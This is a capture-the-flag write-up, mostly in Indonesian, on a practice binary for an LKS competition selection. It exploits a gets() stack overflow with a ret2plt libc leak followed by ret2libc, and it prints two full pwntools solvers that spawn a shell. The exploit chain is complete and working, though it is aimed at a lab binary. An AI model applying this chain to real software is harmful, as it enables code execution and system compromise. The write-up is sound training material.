---
slug: "pwn-combination-64"
title: "combination_64"
competition: "Exercise"
category: "Pwn"
difficulty: "Medium"
date: "2026-08-18"
updated: "2026-08-24"
summary: "Latihan buat persiapan seleksi LKS, isinya ret2plt and ret2libc."
tags: ["PWN","ROP","HANDS-ON","MEDIUM","X64","RET2PLT","RET2LIBC"]
status: "published"
flag: "SHELL"
attachments: []
source: "https://claritys.web.id/writeups/pwn-combination-64"
---

# combination_64

> Latihan buat persiapan seleksi LKS, isinya ret2plt and ret2libc.

Langsung saja kita checksec.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/combine main*
❯ checksec combination_64                                                        󰥔 17:18:45
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/combine/combination_64'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Let’s check the function.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/combine main*
❯ pwndbg combination_64                                                          󰥔 17:18:52
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.00ms using Python engine 3.13
pwndbg: loaded 212 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from combination_64...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.cachyos.org>
  <https://debuginfod.archlinux.org>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in combination_64)
gef➤  info fun
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401070  puts@plt
0x0000000000401080  printf@plt
0x0000000000401090  gets@plt
0x00000000004010a0  setvbuf@plt
0x00000000004010b0  _start
0x00000000004010e0  _dl_relocate_static_pie
0x00000000004010f0  deregister_tm_clones
0x0000000000401120  register_tm_clones
0x0000000000401160  __do_global_dtors_aux
0x0000000000401190  frame_dummy
0x0000000000401196  init
0x00000000004011dd  luna_learn
0x0000000000401250  main
0x0000000000401280  __libc_csu_init
0x00000000004012f0  __libc_csu_fini
0x00000000004012f8  _fini
```

There’s so many symbols and function in this one, lets check the function.

```
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000401250 <+0>:     endbr64
   0x0000000000401254 <+4>:     push   rbp
   0x0000000000401255 <+5>:     mov    rbp,rsp
   0x0000000000401258 <+8>:     mov    eax,0x0
   0x000000000040125d <+13>:    call   0x401196 <init>
   0x0000000000401262 <+18>:    lea    rdi,[rip+0xf01]        # 0x40216a
   0x0000000000401269 <+25>:    call   0x401070 <puts@plt>
   0x000000000040126e <+30>:    mov    eax,0x0
   0x0000000000401273 <+35>:    call   0x4011dd <luna_learn>
   0x0000000000401278 <+40>:    mov    eax,0x0
   0x000000000040127d <+45>:    pop    rbp
   0x000000000040127e <+46>:    ret
End of assembler dump.
gef➤  disas luna_learn
Dump of assembler code for function luna_learn:
   0x00000000004011dd <+0>:     endbr64
   0x00000000004011e1 <+4>:     push   rbp
   0x00000000004011e2 <+5>:     mov    rbp,rsp
   0x00000000004011e5 <+8>:     sub    rsp,0x100
   0x00000000004011ec <+15>:    lea    rdi,[rip+0xe15]        # 0x402008
   0x00000000004011f3 <+22>:    call   0x401070 <puts@plt>
   0x00000000004011f8 <+27>:    lea    rdi,[rip+0xe21]        # 0x402020
   0x00000000004011ff <+34>:    call   0x401070 <puts@plt>
   0x0000000000401204 <+39>:    lea    rdi,[rip+0xe75]        # 0x402080
   0x000000000040120b <+46>:    call   0x401070 <puts@plt>
   0x0000000000401210 <+51>:    lea    rdi,[rip+0xed1]        # 0x4020e8
   0x0000000000401217 <+58>:    call   0x401070 <puts@plt>
   0x000000000040121c <+63>:    lea    rdi,[rip+0xeed]        # 0x402110
   0x0000000000401223 <+70>:    mov    eax,0x0
   0x0000000000401228 <+75>:    call   0x401080 <printf@plt>
   0x000000000040122d <+80>:    lea    rax,[rbp-0x100]
   0x0000000000401234 <+87>:    mov    rdi,rax
   0x0000000000401237 <+90>:    mov    eax,0x0
   0x000000000040123c <+95>:    call   0x401090 <gets@plt>
   0x0000000000401241 <+100>:   lea    rdi,[rip+0xef0]        # 0x402138
   0x0000000000401248 <+107>:   call   0x401070 <puts@plt>
   0x000000000040124d <+112>:   nop
   0x000000000040124e <+113>:   leave
   0x000000000040124f <+114>:   ret
End of assembler dump.
```

Now we count the padding for the gets. 0x100 = 256, because its x64, we need 264 for reaching RIP. And now we verification for the offset for the RIP.

```
>>> 0x100
256
>>> 0x100 + 8
264
```

```
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x32
$rbx   : 0x0
$rcx   : 0x00007ffff7e4f750  →  0x0000000000000000
$rdx   : 0x00007ffff7e4f750  →  0x0000000000000000
$rsp   : 0x00007fffffffdf98  →  "iaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa"
$rbp   : 0x6261616161616168 ("haaaaaab"?)
$rsi   : 0x00007ffff7e4e603  →  0xe4f750000000000a ("\n"?)
$rdi   : 0x1
$rip   : 0x000000000040124f  →  <luna_learn+0072> ret
$r8    : 0x1
$r9    : 0x0
$r10   : 0x0
$r11   : 0x202
$r12   : 0x1
$r13   : 0x00007fffffffe0c0  →  0x0000000000000001
$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe3c0  →  0x0000000000000000
$r15   : 0x00007fffffffe0d8  →  0x00007fffffffe504  →  "TERM_PROGRAM=ghostty"
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
──────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf98│+0x0000: "iaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa"       ← $rsp
0x00007fffffffdfa0│+0x0008: "jaaaaaabkaaaaaablaaaaaabmaaa"
0x00007fffffffdfa8│+0x0010: "kaaaaaablaaaaaabmaaa"
0x00007fffffffdfb0│+0x0018: "laaaaaabmaaa"
0x00007fffffffdfb8│+0x0020: 0x000000006161616d ("maaa"?)
0x00007fffffffdfc0│+0x0028: 0x00000001f7fe1bf0
0x00007fffffffdfc8│+0x0030: 0x00007fffffffe0c8  →  0x00007fffffffe497  →  "/home/claritys/ctf/pwncheatsheet/learnfromLKS/Bina[...]"
0x00007fffffffdfd0│+0x0038: 0x0000000000400040  →   (bad)
────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401248 <luna_learn+006b> call   0x401070 <puts@plt>
     0x40124d <luna_learn+0070> nop
     0x40124e <luna_learn+0071> leave
 →   0x40124f <luna_learn+0072> ret
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "combination_64", stopped 0x40124f in luna_learn (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40124f → luna_learn()
───────────────────────────────────────────────────────────────────────────────────────────
gef➤  cyclic -l iaaaaaab
Finding cyclic pattern of 8 bytes: b'iaaaaaab' (hex: 0x6961616161616162)
Found at offset 264
```

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/combine main*
❯ ./combination_64                                                               󰥔 17:23:53
Mari belajar dengan luna
Luna: Halooo! Aku Luna
Luna: Hari ini kita belajar combinasinya. Namun... Luna tidak tau caranya. Apakah kamu tau?
Luna: Kata kakak Yui sih... gabungin ret2plt dan ret2lib. Tapi... Luna tidak tau caranya, hem...
Luna: Bisakah kamu membantu luna?
Luna: Harusnya sih... Kayak gini yah
>test

 Luna: Harusnya sudah sih... Ehm... semoga yahh
```

Nah, karena disitu kita sudah diberi hint bahwa ini itu gabungan antara ret2plt and ret2lib. Basically, ret2plt itu mengubah .plt menjadi .got biar bisa dileak

ret2plt itu nimpa adddress plt dengan address got yang dimau.  
kita nanti nimpanya pakai got.plt.  
ngubah value dari got pltnya  
yang dibaca got, jadi nanti puts yang plt itu bakal ngebaca address si puts got.apa

Template biasanya itu seperti ini:

```
p.recvline()

payload = flat(
	b'A' * padding,
	POP_RDI,
	elf.got['puts']
	elf.plt['puts'],
	elf.symbols['main']
)
p.sendline(payload)

# Parse the leaked puts address
p.recvuntil(b'Leaving!\n\n')                    # Skip program output
leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))  # Parse leaked address
log.success("Leaked puts: %#x", leak)

# Calculate libc base address
libc.address = leak - libc.symbols['puts']
log.success("LIBC base: %#x", libc.address)

# Stage 2: Use calculated addresses for ret2libc
payload = flat(
    'A' * 40,                          # Padding to return address
    pop_rdi,                           # ROP gadget: pop rdi; ret
    next(libc.search(b'/bin/sh')),     # Argument: "/bin/sh" string address
    libc.sym['system'],                # Call system()
    0x0                                # Return address for system()
)

p.sendline(payload)
p.interactive()
```

But in this challenge, tidak jauh berbeda. Kita hanya mengubah waktu di mana masuk ke puts\_leak. Tinggal memasukkan recvuntil disaat hampir selesai biar kita bisa mendapatkan leak yang puts lalu dimasukkan ke variable.

**Konsep ngeleaknya itu sama seperti biasa, yaitu bawah pertamanya adalah return address, dan yang kedua adalah args1.**

My solver with intended solve:

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("combination_64_patched")

exe = context.binary
context.terminal = ["ghostty", "-e"]
context.arch = 'amd64'
libc = elf.libc

gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("addr", 1337)

def main():
    r = conn()
    
    # 1. Tunggu prompt input pertama ('>')
    r.recvuntil(b'>')

    padding = 264
    rdi = 0x00000000004012e3
    ret = 0x000000000040101a

    # Stage 1: Leak GOT puts
    payload = flat(
        b'A' * padding,
        rdi,
        elf.got['puts'],
        elf.plt['puts'],
        elf.symbols['main']
    )
    r.sendline(payload)

    # 2. Makan seluruh teks banner akhir TERMASUK newline di ujungnya
    r.recvuntil(b'Luna: Harusnya sudah sih... Ehm... semoga yahh \n')

    # 3. Ambil baris persis tempat puts(got) mencetak leak
    # r.recvline() sekarang akan mengambil 6 byte leak + \n
    leak_raw = r.recvline().strip(b'\n')
    leak = u64(leak_raw.ljust(8, b'\x00'))
    log.success("Leaked puts: %#x", leak)

    # 4. Hitung basis libc
    libc.address = leak - libc.symbols['puts']
    log.success("LIBC base: %#x", libc.address)

    # 5. Karena ROP kembali ke main(), tunggu prompt input kedua ('>')
    r.recvuntil(b'>')

    # Stage 2: system("/bin/sh") + Stack Alignment
    payload = flat(
        b'A' * padding,
        ret,  # ROP gadget 'ret' tambahan untuk alignment RSP (16-byte)
        rdi,
        next(libc.search(b'/bin/sh\x00')),
        libc.sym['system']
    )
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
```

Implement:

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/combine main*
❯ python3 solve.py LOCAL                                                         󰥔 18:24:58
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/combine/combination_64_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] '/usr/lib/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[x] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[.] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[+] on/ROP/ret2combine/combine/combination_64_patched': pid 229616
[+] Leaked puts: 0x7f49c0695d20
[+] LIBC base: 0x7f49c0600000
[*] Switching to interactive mode

 Luna: Harusnya sudah sih... Ehm... semoga yahh
$ ls
combination_32          combination_64          combination.c  solve32.py
combination_32_patched  combination_64_patched  combine.zip    solve.py
```

Solver resmi dari latihan LKS nya adalah:

```python
from pwn import *

elf = context.binary = ELF('./combination_64')
libc = elf.libc
p = process()

rdi = p64(0x4012e3)
ret = p64(0x40124f)
offset = 264

payload = flat (
    'A' * offset,
    rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main']
)

p.sendlineafter(b'>',payload)
p.recvuntil("Luna: Harusnya sudah sih... Ehm... semoga yahh \n")

puts_leak = u64(p.recvline().strip(b'\n').ljust(8, b'\x00'))
libc.address = puts_leak - libc.sym['puts']

payload = flat(
    'A' * offset,
    rdi,
    next(libc.search(b'/bin/sh')),
    ret,
    libc.sym['system']
)

p.sendlineafter(b'>',payload)
p.interactive()⏎
```
